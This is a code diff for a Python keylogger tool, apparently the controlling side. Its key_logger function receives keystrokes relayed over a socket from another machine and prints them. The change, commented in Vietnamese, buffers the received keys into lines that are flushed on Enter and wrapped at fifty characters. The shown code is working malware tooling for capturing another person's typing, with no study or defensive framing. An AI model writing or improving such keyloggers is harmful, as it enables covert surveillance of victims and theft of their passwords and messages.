@@ -6,7 +6,9 @@ keylogger_running = False
 
 def key_logger(client_socket):
     print("Connected to the server. Listening for keystrokes... (Press 'Esc' to stop)")
-
+    keys_pressed = ""
+    MAX_LINE_LENGTH = 50
+    
     def on_press(key):
         # Stop the keylogger locally and notify the server when 'Esc' is pressed
         if key == keyboard.Key.esc:
@@ -33,7 +35,20 @@ def key_logger(client_socket):
                     print("No more data received. Exiting...\n")
                     break
                 
-                print(decoded_data, end='', flush=True)  # Print received keystrokes
+                # Kiểm tra nếu nhận ký tự Enter từ server
+                if decoded_data == ' Key.enter ':
+                    # Khi nhận phím Enter, in ra các phím đã nhấn và reset
+                    print(f'\rKeys pressed: {keys_pressed}')  # In ra các phím đã nhấn
+                    keys_pressed = ""  # Reset sau khi nhấn Enter
+                    print("Keys pressed: ", end='')  # Đưa con trỏ về đầu dòng để tiếp tục nhập
+                else:
+                    keys_pressed += decoded_data  # Thêm ký tự vào chuỗi
+                    
+                    # Nếu dòng quá dài, xuống dòng mà không lặp lại ký tự
+                    if len(keys_pressed) > MAX_LINE_LENGTH:
+                        print(f'\rKeys pressed: {keys_pressed[:MAX_LINE_LENGTH]}')  # In phần đầu của dòng
+                        keys_pressed = keys_pressed[MAX_LINE_LENGTH:]  # Lưu phần còn lại để in tiếp
+                    print(f'\rKeys pressed: {keys_pressed}', end='')  # In ra trên cùng một dòng
                 
         except Exception as e:
             print(f"Error receiving data: {e}")
